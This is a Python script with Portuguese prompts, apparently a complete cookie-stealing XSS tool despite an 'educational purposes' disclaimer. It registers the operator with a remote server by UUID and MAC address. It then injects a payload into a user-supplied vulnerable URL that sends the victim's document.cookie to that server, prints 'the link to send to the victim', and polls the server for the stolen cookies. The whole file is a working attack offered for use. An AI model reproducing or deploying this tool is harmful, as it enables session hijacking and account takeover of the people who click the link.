
import urllib.request
from time import sleep
from uuid import uuid4
from uuid import getnode as getmac

print('Esse programa foi criado com fins educacionais!')
print('Os criadores não se responsabilizam por qualquer tipo de irregularidade feita usando nosso sistema.')

at = 0
target = ''
server = 'http://jnydutra.tk:3000/'
id = str(uuid4())
mac = ''
mac += ':'.join(['{:02x}'.format((getmac() >> ele) & 0xff)
for ele in range(0,8*6,8)][::-1])
print('id: ' + id)
print('mac: ' + mac)

def testconnection():
    print('''
                     __   .__           __  .__    .__        _____  ____  ___ _________ _________
  ____  ____   ____ |  | _|__| ____   _/  |_|  |__ |__| _____/ ____\ \   \/  //   _____//   _____/
_/ ___\/  _ \ /  _ \|  |/ |  _/ __ \  \   __|  |  \|  _/ __ \   __\   \     / \_____  \ \_____  \ 
\  \__(  <_> (  <_> |    <|  \  ___/   |  | |   Y  |  \  ___/|  |     /     \ /        \/        /
 \___  \____/ \____/|__|_ |__|\___  >  |__| |___|  |__|\___  |__|    /___/\  /_______  /_______  /
     \/                  \/       \/             \/        \/              \_/       \/        \/    
    ''')
    print('Testando se vocẽ está conectado na internet...')
    try:
        urllib.request.urlopen('http://google.com')
        print('Connected!')
    except urllib.error.URLError:
        print('\nSe você tem certeza de que está conectado, tente novamente.')
        exit()
    createuser()

def createuser():
    print('Criando usuário com:')
    global id
    global server
    global mac
    print('id: ' + id)
    print('mac: ' + mac + '\n')
    try:
        res = str(urllib.request.urlopen('{}option=create@id={}@mac={}'.format(server, id, mac)).read())
        res = res[2:len(res)]
    except urllib.error.URLError:
        print('O servidor não está ligado.')
        exit()
    if res[0] == 'l':
        a = input('Você já abriu esse programa antes. Você quer carregar seus cookies antigos? [Y/n]')
        if a == 'Y' or a == 'y' or a == '':
            id = res[6:len(res)-1]
        elif a == 'N' or a == 'n':
            try:
                print('Deletando sua outra conta...')
                urllib.request.urlopen('{}option=deleteOld@id={}@mac={}'.format(server, res[6:], mac)).read()
                print('Criando sua nova conta...')
                urllib.request.urlopen('{}option=create@id={}@mac={}'.format(server, id, mac))
            except urllib.error.URLError:
                print('O servidor não está ligado.')
                exit()
            print('Usuário criado com sucesso!')
    elif res[0] == 'c':
        print('Usuário criado com sucesso!')
    settarget()

def settarget():
    global server
    global target
    target = input('''
    Escreva o URL, com as tags <script> e </script> posicionadas:
    Exemplo: https://www.google.com/search_results.php?s="><script></script><meta name="

    --> ''')
    getlink()

def getlink():
    global server
    global id
    p1 = target.find('<script>')+8
    p2 = target.find('</script>')
    link = target[:p1] + 'new Image().src="{}option=addCk@id={}@cookie=".concat(document.cookie)'.format(server, id) + target[p2:]
    print('O link que deve ser mandado para a vítima é:\n' + link)
    cookies()

def cookies():
    global server
    global id
    global at
    try:
        while True: 
            try:
                cookies = str(urllib.request.urlopen('{}option=checkCk@id={}@mac={}@at={}'.format(server, id, mac, at)).read())
            except urllib.error.URLError:
                print('O servidor não está ligado.')
                exit()
            c = cookies.split('#')
            c = c[:len(c)-1]
            at += len(c)
            if len(c) > 0:
                for i in c:
                    if i[2:] != '':
                        print(i[2:])
            sleep(5)
    except KeyboardInterrupt:
        exit()
        


testconnection()
